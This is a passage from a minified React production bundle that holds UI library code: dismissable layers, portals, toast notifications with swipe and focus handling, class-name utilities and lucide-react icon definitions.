  x.useEffect(() => {
    const r = s => {
      s.key === "Escape" && n(s)
    };
    return t.addEventListener("keydown", r, {
      capture: !0
    }), () => t.removeEventListener("keydown", r, {
      capture: !0
    })
  }, [n, t])
}
var VS = "DismissableLayer",
  ed = "dismissableLayer.update",
  BS = "dismissableLayer.pointerDownOutside",
  zS = "dismissableLayer.focusOutside",
  Um, pv = x.createContext({
    layers: new Set,
    layersWithOutsidePointerEventsDisabled: new Set,
    branches: new Set
  }),
  gv = x.forwardRef((e, t) => {
    const {
      disableOutsidePointerEvents: n = !1,
      onEscapeKeyDown: r,
      onPointerDownOutside: s,
      onFocusOutside: o,
      onInteractOutside: i,
      onDismiss: a,
      ...c
    } = e, u = x.useContext(pv), [d, f] = x.useState(null), h = (d == null ? void 0 : d.ownerDocument) ?? (globalThis == null ? void 0 : globalThis.document), [, y] = x.useState({}), w = Hr(t, A => f(A)), v = Array.from(u.layers), [S] = [...u.layersWithOutsidePointerEventsDisabled].slice(-1), g = v.indexOf(S), p = d ? v.indexOf(d) : -1, m = u.layersWithOutsidePointerEventsDisabled.size > 0, b = p >= g, C = $S(A => {
      const P = A.target,
        M = [...u.branches].some(_ => _.contains(P));
      !b || M || (s == null || s(A), i == null || i(A), A.defaultPrevented || a == null || a())
    }, h), j = HS(A => {
      const P = A.target;
      [...u.branches].some(_ => _.contains(P)) || (o == null || o(A), i == null || i(A), A.defaultPrevented || a == null || a())
    }, h);
    return FS(A => {
      p === u.layers.size - 1 && (r == null || r(A), !A.defaultPrevented && a && (A.preventDefault(), a()))
    }, h), x.useEffect(() => {
      if (d) return n && (u.layersWithOutsidePointerEventsDisabled.size === 0 && (Um = h.body.style.pointerEvents, h.body.style.pointerEvents = "none"), u.layersWithOutsidePointerEventsDisabled.add(d)), u.layers.add(d), $m(), () => {
        n && u.layersWithOutsidePointerEventsDisabled.size === 1 && (h.body.style.pointerEvents = Um)
      }
    }, [d, h, n, u]), x.useEffect(() => () => {
      d && (u.layers.delete(d), u.layersWithOutsidePointerEventsDisabled.delete(d), $m())
    }, [d, u]), x.useEffect(() => {
      const A = () => y({});
      return document.addEventListener(ed, A), () => document.removeEventListener(ed, A)
    }, []), l.jsx(cn.div, {
      ...c,
      ref: w,
      style: {
        pointerEvents: m ? b ? "auto" : "none" : void 0,
        ...e.style
      },
      onFocusCapture: gt(e.onFocusCapture, j.onFocusCapture),
      onBlurCapture: gt(e.onBlurCapture, j.onBlurCapture),
      onPointerDownCapture: gt(e.onPointerDownCapture, C.onPointerDownCapture)
    })
  });
gv.displayName = VS;
var US = "DismissableLayerBranch",
  yv = x.forwardRef((e, t) => {
    const n = x.useContext(pv),
      r = x.useRef(null),
      s = Hr(t, r);
    return x.useEffect(() => {
      const o = r.current;
      if (o) return n.branches.add(o), () => {
        n.branches.delete(o)
      }
    }, [n.branches]), l.jsx(cn.div, {
      ...e,
      ref: s
    })
  });
yv.displayName = US;

function $S(e, t = globalThis == null ? void 0 : globalThis.document) {
  const n = Dn(e),
    r = x.useRef(!1),
    s = x.useRef(() => { });
  return x.useEffect(() => {
    const o = a => {
      if (a.target && !r.current) {
        let c = function () {
          vv(BS, n, u, {
            discrete: !0
          })
        };
        const u = {
          originalEvent: a
        };
        a.pointerType === "touch" ? (t.removeEventListener("click", s.current), s.current = c, t.addEventListener("click", s.current, {
          once: !0
        })) : c()
      } else t.removeEventListener("click", s.current);
      r.current = !1
    },
      i = window.setTimeout(() => {
        t.addEventListener("pointerdown", o)
      }, 0);
    return () => {
      window.clearTimeout(i), t.removeEventListener("pointerdown", o), t.removeEventListener("click", s.current)
    }
  }, [t, n]), {
    onPointerDownCapture: () => r.current = !0
  }
}

function HS(e, t = globalThis == null ? void 0 : globalThis.document) {
  const n = Dn(e),
    r = x.useRef(!1);
  return x.useEffect(() => {
    const s = o => {
      o.target && !r.current && vv(zS, n, {
        originalEvent: o
      }, {
        discrete: !1
      })
    };
    return t.addEventListener("focusin", s), () => t.removeEventListener("focusin", s)
  }, [t, n]), {
    onFocusCapture: () => r.current = !0,
    onBlurCapture: () => r.current = !1
  }
}

function $m() {
  const e = new CustomEvent(ed);
  document.dispatchEvent(e)
}

function vv(e, t, n, {
  discrete: r
}) {
  const s = n.originalEvent.target,
    o = new CustomEvent(e, {
      bubbles: !1,
      cancelable: !0,
      detail: n
    });
  t && s.addEventListener(e, t, {
    once: !0
  }), r ? mv(s, o) : s.dispatchEvent(o)
}
var WS = gv,
  KS = yv,
  tl = globalThis != null && globalThis.document ? x.useLayoutEffect : () => { },
  QS = "Portal",
  xv = x.forwardRef((e, t) => {
    var a;
    const {
      container: n,
      ...r
    } = e, [s, o] = x.useState(!1);
    tl(() => o(!0), []);
    const i = n || s && ((a = globalThis == null ? void 0 : globalThis.document) == null ? void 0 : a.body);
    return i ? qb.createPortal(l.jsx(cn.div, {
      ...r,
      ref: t
    }), i) : null
  });
xv.displayName = QS;

function GS(e, t) {
  return x.useReducer((n, r) => t[n][r] ?? n, e)
}
var wv = e => {
  const {
    present: t,
    children: n
  } = e, r = qS(t), s = typeof n == "function" ? n({
    present: r.isPresent
  }) : x.Children.only(n), o = Hr(r.ref, YS(s));
  return typeof n == "function" || r.isPresent ? x.cloneElement(s, {
    ref: o
  }) : null
};
wv.displayName = "Presence";

function qS(e) {
  const [t, n] = x.useState(), r = x.useRef({}), s = x.useRef(e), o = x.useRef("none"), i = e ? "mounted" : "unmounted", [a, c] = GS(i, {
    mounted: {
      UNMOUNT: "unmounted",
      ANIMATION_OUT: "unmountSuspended"
    },
    unmountSuspended: {
      MOUNT: "mounted",
      ANIMATION_END: "unmounted"
    },
    unmounted: {
      MOUNT: "mounted"
    }
  });
  return x.useEffect(() => {
    const u = ra(r.current);
    o.current = a === "mounted" ? u : "none"
  }, [a]), tl(() => {
    const u = r.current,
      d = s.current;
    if (d !== e) {
      const h = o.current,
        y = ra(u);
      e ? c("MOUNT") : y === "none" || (u == null ? void 0 : u.display) === "none" ? c("UNMOUNT") : c(d && h !== y ? "ANIMATION_OUT" : "UNMOUNT"), s.current = e
    }
  }, [e, c]), tl(() => {
    if (t) {
      let u;
      const d = t.ownerDocument.defaultView ?? window,
        f = y => {
          const v = ra(r.current).includes(y.animationName);
          if (y.target === t && v && (c("ANIMATION_END"), !s.current)) {
            const S = t.style.animationFillMode;
            t.style.animationFillMode = "forwards", u = d.setTimeout(() => {
              t.style.animationFillMode === "forwards" && (t.style.animationFillMode = S)
            })
          }
        },
        h = y => {
          y.target === t && (o.current = ra(r.current))
        };
      return t.addEventListener("animationstart", h), t.addEventListener("animationcancel", f), t.addEventListener("animationend", f), () => {
        d.clearTimeout(u), t.removeEventListener("animationstart", h), t.removeEventListener("animationcancel", f), t.removeEventListener("animationend", f)
      }
    } else c("ANIMATION_END")
  }, [t, c]), {
    isPresent: ["mounted", "unmountSuspended"].includes(a),
    ref: x.useCallback(u => {
      u && (r.current = getComputedStyle(u)), n(u)
    }, [])
  }
}

function ra(e) {
  return (e == null ? void 0 : e.animationName) || "none"
}

function YS(e) {
  var r, s;
  let t = (r = Object.getOwnPropertyDescriptor(e.props, "ref")) == null ? void 0 : r.get,
    n = t && "isReactWarning" in t && t.isReactWarning;
  return n ? e.ref : (t = (s = Object.getOwnPropertyDescriptor(e, "ref")) == null ? void 0 : s.get, n = t && "isReactWarning" in t && t.isReactWarning, n ? e.props.ref : e.props.ref || e.ref)
}

function XS({
  prop: e,
  defaultProp: t,
  onChange: n = () => { }
}) {
  const [r, s] = JS({
    defaultProp: t,
    onChange: n
  }), o = e !== void 0, i = o ? e : r, a = Dn(n), c = x.useCallback(u => {
    if (o) {
      const f = typeof u == "function" ? u(e) : u;
      f !== e && a(f)
    } else s(u)
  }, [o, e, s, a]);
  return [i, c]
}

function JS({
  defaultProp: e,
  onChange: t
}) {
  const n = x.useState(e),
    [r] = n,
    s = x.useRef(r),
    o = Dn(t);
  return x.useEffect(() => {
    s.current !== r && (o(r), s.current = r)
  }, [r, s, o]), n
}
var ZS = "VisuallyHidden",
  Nf = x.forwardRef((e, t) => l.jsx(cn.span, {
    ...e,
    ref: t,
    style: {
      position: "absolute",
      border: 0,
      width: 1,
      height: 1,
      padding: 0,
      margin: -1,
      overflow: "hidden",
      clip: "rect(0, 0, 0, 0)",
      whiteSpace: "nowrap",
      wordWrap: "normal",
      ...e.style
    }
  }));
Nf.displayName = ZS;
var jf = "ToastProvider",
  [Af, eC, tC] = _S("Toast"),
  [bv, mT] = IS("Toast", [tC]),
  [nC, Il] = bv(jf),
  Sv = e => {
    const {
      __scopeToast: t,
      label: n = "Notification",
      duration: r = 5e3,
      swipeDirection: s = "right",
      swipeThreshold: o = 50,
      children: i
    } = e, [a, c] = x.useState(null), [u, d] = x.useState(0), f = x.useRef(!1), h = x.useRef(!1);
    return n.trim() || console.error(`Invalid prop \`label\` supplied to \`${jf}\`. Expected non-empty \`string\`.`), l.jsx(Af.Provider, {
      scope: t,
      children: l.jsx(nC, {
        scope: t,
        label: n,
        duration: r,
        swipeDirection: s,
        swipeThreshold: o,
        toastCount: u,
        viewport: a,
        onViewportChange: c,
        onToastAdd: x.useCallback(() => d(y => y + 1), []),
        onToastRemove: x.useCallback(() => d(y => y - 1), []),
        isFocusedToastEscapeKeyDownRef: f,
        isClosePausedRef: h,
        children: i
      })
    })
  };
Sv.displayName = jf;
var Cv = "ToastViewport",
  rC = ["F8"],
  td = "toast.viewportPause",
  nd = "toast.viewportResume",
  Nv = x.forwardRef((e, t) => {
    const {
      __scopeToast: n,
      hotkey: r = rC,
      label: s = "Notifications ({hotkey})",
      ...o
    } = e, i = Il(Cv, n), a = eC(n), c = x.useRef(null), u = x.useRef(null), d = x.useRef(null), f = x.useRef(null), h = Hr(t, f, i.onViewportChange), y = r.join("+").replace(/Key/g, "").replace(/Digit/g, ""), w = i.toastCount > 0;
    x.useEffect(() => {
      const S = g => {
        var m;
        r.length !== 0 && r.every(b => g[b] || g.code === b) && ((m = f.current) == null || m.focus())
      };
      return document.addEventListener("keydown", S), () => document.removeEventListener("keydown", S)
    }, [r]), x.useEffect(() => {
      const S = c.current,
        g = f.current;
      if (w && S && g) {
        const p = () => {
          if (!i.isClosePausedRef.current) {
            const j = new CustomEvent(td);
            g.dispatchEvent(j), i.isClosePausedRef.current = !0
          }
        },
          m = () => {
            if (i.isClosePausedRef.current) {
              const j = new CustomEvent(nd);
              g.dispatchEvent(j), i.isClosePausedRef.current = !1
            }
          },
          b = j => {
            !S.contains(j.relatedTarget) && m()
          },
          C = () => {
            S.contains(document.activeElement) || m()
          };
        return S.addEventListener("focusin", p), S.addEventListener("focusout", b), S.addEventListener("pointermove", p), S.addEventListener("pointerleave", C), window.addEventListener("blur", p), window.addEventListener("focus", m), () => {
          S.removeEventListener("focusin", p), S.removeEventListener("focusout", b), S.removeEventListener("pointermove", p), S.removeEventListener("pointerleave", C), window.removeEventListener("blur", p), window.removeEventListener("focus", m)
        }
      }
    }, [w, i.isClosePausedRef]);
    const v = x.useCallback(({
      tabbingDirection: S
    }) => {
      const p = a().map(m => {
        const b = m.ref.current,
          C = [b, ...gC(b)];
        return S === "forwards" ? C : C.reverse()
      });
      return (S === "forwards" ? p.reverse() : p).flat()
    }, [a]);
    return x.useEffect(() => {
      const S = f.current;
      if (S) {
        const g = p => {
          var C, j, A;
          const m = p.altKey || p.ctrlKey || p.metaKey;
          if (p.key === "Tab" && !m) {
            const P = document.activeElement,
              M = p.shiftKey;
            if (p.target === S && M) {
              (C = u.current) == null || C.focus();
              return
            }
            const I = v({
              tabbingDirection: M ? "backwards" : "forwards"
            }),
              $ = I.findIndex(U => U === P);
            Mc(I.slice($ + 1)) ? p.preventDefault() : M ? (j = u.current) == null || j.focus() : (A = d.current) == null || A.focus()
          }
        };
        return S.addEventListener("keydown", g), () => S.removeEventListener("keydown", g)
      }
    }, [a, v]), l.jsxs(KS, {
      ref: c,
      role: "region",
      "aria-label": s.replace("{hotkey}", y),
      tabIndex: -1,
      style: {
        pointerEvents: w ? void 0 : "none"
      },
      children: [w && l.jsx(rd, {
        ref: u,
        onFocusFromOutsideViewport: () => {
          const S = v({
            tabbingDirection: "forwards"
          });
          Mc(S)
        }
      }), l.jsx(Af.Slot, {
        scope: n,
        children: l.jsx(cn.ol, {
          tabIndex: -1,
          ...o,
          ref: h
        })
      }), w && l.jsx(rd, {
        ref: d,
        onFocusFromOutsideViewport: () => {
          const S = v({
            tabbingDirection: "backwards"
          });
          Mc(S)
        }
      })]
    })
  });
Nv.displayName = Cv;
var jv = "ToastFocusProxy",
  rd = x.forwardRef((e, t) => {
    const {
      __scopeToast: n,
      onFocusFromOutsideViewport: r,
      ...s
    } = e, o = Il(jv, n);
    return l.jsx(Nf, {
      "aria-hidden": !0,
      tabIndex: 0,
      ...s,
      ref: t,
      style: {
        position: "fixed"
      },
      onFocus: i => {
        var u;
        const a = i.relatedTarget;
        !((u = o.viewport) != null && u.contains(a)) && r()
      }
    })
  });
rd.displayName = jv;
var Ll = "Toast",
  sC = "toast.swipeStart",
  oC = "toast.swipeMove",
  iC = "toast.swipeCancel",
  aC = "toast.swipeEnd",
  Av = x.forwardRef((e, t) => {
    const {
      forceMount: n,
      open: r,
      defaultOpen: s,
      onOpenChange: o,
      ...i
    } = e, [a = !0, c] = XS({
      prop: r,
      defaultProp: s,
      onChange: o
    });
    return l.jsx(wv, {
      present: n || a,
      children: l.jsx(uC, {
        open: a,
        ...i,
        ref: t,
        onClose: () => c(!1),
        onPause: Dn(e.onPause),
        onResume: Dn(e.onResume),
        onSwipeStart: gt(e.onSwipeStart, u => {
          u.currentTarget.setAttribute("data-swipe", "start")
        }),
        onSwipeMove: gt(e.onSwipeMove, u => {
          const {
            x: d,
            y: f
          } = u.detail.delta;
          u.currentTarget.setAttribute("data-swipe", "move"), u.currentTarget.style.setProperty("--radix-toast-swipe-move-x", `${d}px`), u.currentTarget.style.setProperty("--radix-toast-swipe-move-y", `${f}px`)
        }),
        onSwipeCancel: gt(e.onSwipeCancel, u => {
          u.currentTarget.setAttribute("data-swipe", "cancel"), u.currentTarget.style.removeProperty("--radix-toast-swipe-move-x"), u.currentTarget.style.removeProperty("--radix-toast-swipe-move-y"), u.currentTarget.style.removeProperty("--radix-toast-swipe-end-x"), u.currentTarget.style.removeProperty("--radix-toast-swipe-end-y")
        }),
        onSwipeEnd: gt(e.onSwipeEnd, u => {
          const {
            x: d,
            y: f
          } = u.detail.delta;
          u.currentTarget.setAttribute("data-swipe", "end"), u.currentTarget.style.removeProperty("--radix-toast-swipe-move-x"), u.currentTarget.style.removeProperty("--radix-toast-swipe-move-y"), u.currentTarget.style.setProperty("--radix-toast-swipe-end-x", `${d}px`), u.currentTarget.style.setProperty("--radix-toast-swipe-end-y", `${f}px`), c(!1)
        })
      })
    })
  });
Av.displayName = Ll;
var [lC, cC] = bv(Ll, {
  onClose() { }
}), uC = x.forwardRef((e, t) => {
  const {
    __scopeToast: n,
    type: r = "foreground",
    duration: s,
    open: o,
    onClose: i,
    onEscapeKeyDown: a,
    onPause: c,
    onResume: u,
    onSwipeStart: d,
    onSwipeMove: f,
    onSwipeCancel: h,
    onSwipeEnd: y,
    ...w
  } = e, v = Il(Ll, n), [S, g] = x.useState(null), p = Hr(t, U => g(U)), m = x.useRef(null), b = x.useRef(null), C = s || v.duration, j = x.useRef(0), A = x.useRef(C), P = x.useRef(0), {
    onToastAdd: M,
    onToastRemove: _
  } = v, G = Dn(() => {
    var te;
    (S == null ? void 0 : S.contains(document.activeElement)) && ((te = v.viewport) == null || te.focus()), i()
  }), I = x.useCallback(U => {
    !U || U === 1 / 0 || (window.clearTimeout(P.current), j.current = new Date().getTime(), P.current = window.setTimeout(G, U))
  }, [G]);
  x.useEffect(() => {
    const U = v.viewport;
    if (U) {
      const te = () => {
        I(A.current), u == null || u()
      },
        re = () => {
          const X = new Date().getTime() - j.current;
          A.current = A.current - X, window.clearTimeout(P.current), c == null || c()
        };
      return U.addEventListener(td, re), U.addEventListener(nd, te), () => {
        U.removeEventListener(td, re), U.removeEventListener(nd, te)
      }
    }
  }, [v.viewport, C, c, u, I]), x.useEffect(() => {
    o && !v.isClosePausedRef.current && I(C)
  }, [o, C, v.isClosePausedRef, I]), x.useEffect(() => (M(), () => _()), [M, _]);
  const $ = x.useMemo(() => S ? Mv(S) : null, [S]);
  return v.viewport ? l.jsxs(l.Fragment, {
    children: [$ && l.jsx(dC, {
      __scopeToast: n,
      role: "status",
      "aria-live": r === "foreground" ? "assertive" : "polite",
      "aria-atomic": !0,
      children: $
    }), l.jsx(lC, {
      scope: n,
      onClose: G,
      children: Dl.createPortal(l.jsx(Af.ItemSlot, {
        scope: n,
        children: l.jsx(WS, {
          asChild: !0,
          onEscapeKeyDown: gt(a, () => {
            v.isFocusedToastEscapeKeyDownRef.current || G(), v.isFocusedToastEscapeKeyDownRef.current = !1
          }),
          children: l.jsx(cn.li, {
            role: "status",
            "aria-live": "off",
            "aria-atomic": !0,
            tabIndex: 0,
            "data-state": o ? "open" : "closed",
            "data-swipe-direction": v.swipeDirection,
            ...w,
            ref: p,
            style: {
              userSelect: "none",
              touchAction: "none",
              ...e.style
            },
            onKeyDown: gt(e.onKeyDown, U => {
              U.key === "Escape" && (a == null || a(U.nativeEvent), U.nativeEvent.defaultPrevented || (v.isFocusedToastEscapeKeyDownRef.current = !0, G()))
            }),
            onPointerDown: gt(e.onPointerDown, U => {
              U.button === 0 && (m.current = {
                x: U.clientX,
                y: U.clientY
              })
            }),
            onPointerMove: gt(e.onPointerMove, U => {
              if (!m.current) return;
              const te = U.clientX - m.current.x,
                re = U.clientY - m.current.y,
                X = !!b.current,
                D = ["left", "right"].includes(v.swipeDirection),
                R = ["left", "up"].includes(v.swipeDirection) ? Math.min : Math.max,
                L = D ? R(0, te) : 0,
                J = D ? 0 : R(0, re),
                oe = U.pointerType === "touch" ? 10 : 2,
                ze = {
                  x: L,
                  y: J
                },
                Ue = {
                  originalEvent: U,
                  delta: ze
                };
              X ? (b.current = ze, sa(oC, f, Ue, {
                discrete: !1
              })) : Hm(ze, v.swipeDirection, oe) ? (b.current = ze, sa(sC, d, Ue, {
                discrete: !1
              }), U.target.setPointerCapture(U.pointerId)) : (Math.abs(te) > oe || Math.abs(re) > oe) && (m.current = null)
            }),
            onPointerUp: gt(e.onPointerUp, U => {
              const te = b.current,
                re = U.target;
              if (re.hasPointerCapture(U.pointerId) && re.releasePointerCapture(U.pointerId), b.current = null, m.current = null, te) {
                const X = U.currentTarget,
                  D = {
                    originalEvent: U,
                    delta: te
                  };
                Hm(te, v.swipeDirection, v.swipeThreshold) ? sa(aC, y, D, {
                  discrete: !0
                }) : sa(iC, h, D, {
                  discrete: !0
                }), X.addEventListener("click", R => R.preventDefault(), {
                  once: !0
                })
              }
            })
          })
        })
      }), v.viewport)
    })]
  }) : null
}), dC = e => {
  const {
    __scopeToast: t,
    children: n,
    ...r
  } = e, s = Il(Ll, t), [o, i] = x.useState(!1), [a, c] = x.useState(!1);
  return mC(() => i(!0)), x.useEffect(() => {
    const u = window.setTimeout(() => c(!0), 1e3);
    return () => window.clearTimeout(u)
  }, []), a ? null : l.jsx(xv, {
    asChild: !0,
    children: l.jsx(Nf, {
      ...r,
      children: o && l.jsxs(l.Fragment, {
        children: [s.label, " ", n]
      })
    })
  })
}, fC = "ToastTitle", Pv = x.forwardRef((e, t) => {
  const {
    __scopeToast: n,
    ...r
  } = e;
  return l.jsx(cn.div, {
    ...r,
    ref: t
  })
});
Pv.displayName = fC;
var hC = "ToastDescription",
  Ev = x.forwardRef((e, t) => {
    const {
      __scopeToast: n,
      ...r
    } = e;
    return l.jsx(cn.div, {
      ...r,
      ref: t
    })
  });
Ev.displayName = hC;
var Tv = "ToastAction",
  kv = x.forwardRef((e, t) => {
    const {
      altText: n,
      ...r
    } = e;
    return n.trim() ? l.jsx(Dv, {
      altText: n,
      asChild: !0,
      children: l.jsx(Pf, {
        ...r,
        ref: t
      })
    }) : (console.error(`Invalid prop \`altText\` supplied to \`${Tv}\`. Expected non-empty \`string\`.`), null)
  });
kv.displayName = Tv;
var Rv = "ToastClose",
  Pf = x.forwardRef((e, t) => {
    const {
      __scopeToast: n,
      ...r
    } = e, s = cC(Rv, n);
    return l.jsx(Dv, {
      asChild: !0,
      children: l.jsx(cn.button, {
        type: "button",
        ...r,
        ref: t,
        onClick: gt(e.onClick, s.onClose)
      })
    })
  });
Pf.displayName = Rv;
var Dv = x.forwardRef((e, t) => {
  const {
    __scopeToast: n,
    altText: r,
    ...s
  } = e;
  return l.jsx(cn.div, {
    "data-radix-toast-announce-exclude": "",
    "data-radix-toast-announce-alt": r || void 0,
    ...s,
    ref: t
  })
});

function Mv(e) {
  const t = [];
  return Array.from(e.childNodes).forEach(r => {
    if (r.nodeType === r.TEXT_NODE && r.textContent && t.push(r.textContent), pC(r)) {
      const s = r.ariaHidden || r.hidden || r.style.display === "none",
        o = r.dataset.radixToastAnnounceExclude === "";
      if (!s)
        if (o) {
          const i = r.dataset.radixToastAnnounceAlt;
          i && t.push(i)
        } else t.push(...Mv(r))
    }
  }), t
}

function sa(e, t, n, {
  discrete: r
}) {
  const s = n.originalEvent.currentTarget,
    o = new CustomEvent(e, {
      bubbles: !0,
      cancelable: !0,
      detail: n
    });
  t && s.addEventListener(e, t, {
    once: !0
  }), r ? mv(s, o) : s.dispatchEvent(o)
}
var Hm = (e, t, n = 0) => {
  const r = Math.abs(e.x),
    s = Math.abs(e.y),
    o = r > s;
  return t === "left" || t === "right" ? o && r > n : !o && s > n
};

function mC(e = () => { }) {
  const t = Dn(e);
  tl(() => {
    let n = 0,
      r = 0;
    return n = window.requestAnimationFrame(() => r = window.requestAnimationFrame(t)), () => {
      window.cancelAnimationFrame(n), window.cancelAnimationFrame(r)
    }
  }, [t])
}

function pC(e) {
  return e.nodeType === e.ELEMENT_NODE
}

function gC(e) {
  const t = [],
    n = document.createTreeWalker(e, NodeFilter.SHOW_ELEMENT, {
      acceptNode: r => {
        const s = r.tagName === "INPUT" && r.type === "hidden";
        return r.disabled || r.hidden || s ? NodeFilter.FILTER_SKIP : r.tabIndex >= 0 ? NodeFilter.FILTER_ACCEPT : NodeFilter.FILTER_SKIP
      }
    });
  for (; n.nextNode();) t.push(n.currentNode);
  return t
}

function Mc(e) {
  const t = document.activeElement;
  return e.some(n => n === t ? !0 : (n.focus(), document.activeElement !== t))
}
var yC = Sv,
  _v = Nv,
  Iv = Av,
  Lv = Pv,
  Ov = Ev,
  Fv = kv,
  Vv = Pf;

function Bv(e) {
  var t, n, r = "";
  if (typeof e == "string" || typeof e == "number") r += e;
  else if (typeof e == "object")
    if (Array.isArray(e))
      for (t = 0; t < e.length; t++) e[t] && (n = Bv(e[t])) && (r && (r += " "), r += n);
    else
      for (t in e) e[t] && (r && (r += " "), r += t);
  return r
}

function vC() {
  for (var e, t, n = 0, r = ""; n < arguments.length;)(e = arguments[n++]) && (t = Bv(e)) && (r && (r += " "), r += t);
  return r
}
const Wm = e => typeof e == "boolean" ? "".concat(e) : e === 0 ? "0" : e,
  Km = vC,
  zv = (e, t) => n => {
    var r;
    if ((t == null ? void 0 : t.variants) == null) return Km(e, n == null ? void 0 : n.class, n == null ? void 0 : n.className);
    const {
      variants: s,
      defaultVariants: o
    } = t, i = Object.keys(s).map(u => {
      const d = n == null ? void 0 : n[u],
        f = o == null ? void 0 : o[u];
      if (d === null) return null;
      const h = Wm(d) || Wm(f);
      return s[u][h]
    }), a = n && Object.entries(n).reduce((u, d) => {
      let [f, h] = d;
      return h === void 0 || (u[f] = h), u
    }, {}), c = t == null || (r = t.compoundVariants) === null || r === void 0 ? void 0 : r.reduce((u, d) => {
      let {
        class: f,
        className: h,
        ...y
      } = d;
      return Object.entries(y).every(w => {
        let [v, S] = w;
        return Array.isArray(S) ? S.includes({
          ...o,
          ...a
        }[v]) : {
          ...o,
          ...a
        }[v] === S
      }) ? [...u, f, h] : u
    }, []);
    return Km(e, i, c, n == null ? void 0 : n.class, n == null ? void 0 : n.className)
  };
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const xC = e => e.replace(/([a-z0-9])([A-Z])/g, "$1-$2").toLowerCase(),
  Uv = (...e) => e.filter((t, n, r) => !!t && r.indexOf(t) === n).join(" ");
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
var wC = {
  xmlns: "http://www.w3.org/2000/svg",
  width: 24,
  height: 24,
  viewBox: "0 0 24 24",
  fill: "none",
  stroke: "currentColor",
  strokeWidth: 2,
  strokeLinecap: "round",
  strokeLinejoin: "round"
};
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const bC = x.forwardRef(({
  color: e = "currentColor",
  size: t = 24,
  strokeWidth: n = 2,
  absoluteStrokeWidth: r,
  className: s = "",
  children: o,
  iconNode: i,
  ...a
}, c) => x.createElement("svg", {
  ref: c,
  ...wC,
  width: t,
  height: t,
  stroke: e,
  strokeWidth: r ? Number(n) * 24 / Number(t) : n,
  className: Uv("lucide", s),
  ...a
}, [...i.map(([u, d]) => x.createElement(u, d)), ...Array.isArray(o) ? o : [o]]));
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Ft = (e, t) => {
  const n = x.forwardRef(({
    className: r,
    ...s
  }, o) => x.createElement(bC, {
    ref: o,
    iconNode: t,
    className: Uv(`lucide-${xC(e)}`, r),
    ...s
  }));
  return n.displayName = `${e}`, n
};
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const It = Ft("Check", [
  ["path", {
    d: "M20 6 9 17l-5-5",
    key: "1gmf2c"
  }]
]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const SC = Ft("ChevronRight", [
  ["path", {
    d: "m9 18 6-6-6-6",
    key: "mthhwq"
  }]
]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const CC = Ft("CircleAlert", [
  ["circle", {
    cx: "12",
    cy: "12",
    r: "10",
    key: "1mglay"
  }],
  ["line", {
    x1: "12",
    x2: "12",
    y1: "8",
    y2: "12",
    key: "1pkeuh"
  }],
  ["line", {
    x1: "12",
    x2: "12.01",
    y1: "16",
    y2: "16",
    key: "4dfq90"
  }]
]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const NC = Ft("Clock", [
  ["circle", {
    cx: "12",
    cy: "12",
    r: "10",
    key: "1mglay"
  }],
  ["polyline", {
    points: "12 6 12 12 16 14",
    key: "68esgv"
  }]
]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Ol = Ft("Copy", [
  ["rect", {
    width: "14",
    height: "14",
    x: "8",
    y: "8",
    rx: "2",
    ry: "2",
    key: "17jyea"
  }],
  ["path", {
    d: "M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2",
    key: "zix9uf"
  }]
]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const jC = Ft("Download", [
  ["path", {
    d: "M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4",
    key: "ih7n3h"
  }],
  ["polyline", {
    points: "7 10 12 15 17 10",
    key: "2ggqvy"
  }],
  ["line", {
    x1: "12",
    x2: "12",
    y1: "15",
    y2: "3",
    key: "1vk2je"
  }]
]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const AC = Ft("FileText", [
  ["path", {
    d: "M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z",
    key: "1rqfz7"
  }],
  ["path", {
    d: "M14 2v4a2 2 0 0 0 2 2h4",
    key: "tnqrlb"
  }],
  ["path", {
    d: "M10 9H8",
    key: "b1mrlr"
  }],
  ["path", {
    d: "M16 13H8",
    key: "t4e002"
  }],
  ["path", {
    d: "M16 17H8",
    key: "z1uh3a"
  }]
]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const vt = Ft("LoaderCircle", [
  ["path", {
    d: "M21 12a9 9 0 1 1-6.219-8.56",
    key: "13zald"
  }]
]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const PC = Ft("QrCode", [
  ["rect", {
    width: "5",
    height: "5",
    x: "3",
    y: "3",
    rx: "1",
    key: "1tu5fj"
  }],
  ["rect", {
    width: "5",
    height: "5",
    x: "16",
    y: "3",
    rx: "1",
    key: "1v8r4q"
  }],
  ["rect", {
    width: "5",
    height: "5",
    x: "3",
    y: "16",
    rx: "1",
    key: "1x03jg"
  }],
  ["path", {
    d: "M21 16h-3a2 2 0 0 0-2 2v3",
    key: "177gqh"
  }],
  ["path", {
    d: "M21 21v.01",
    key: "ents32"
  }],
  ["path", {
    d: "M12 7v3a2 2 0 0 1-2 2H7",
    key: "8crl2c"
  }],
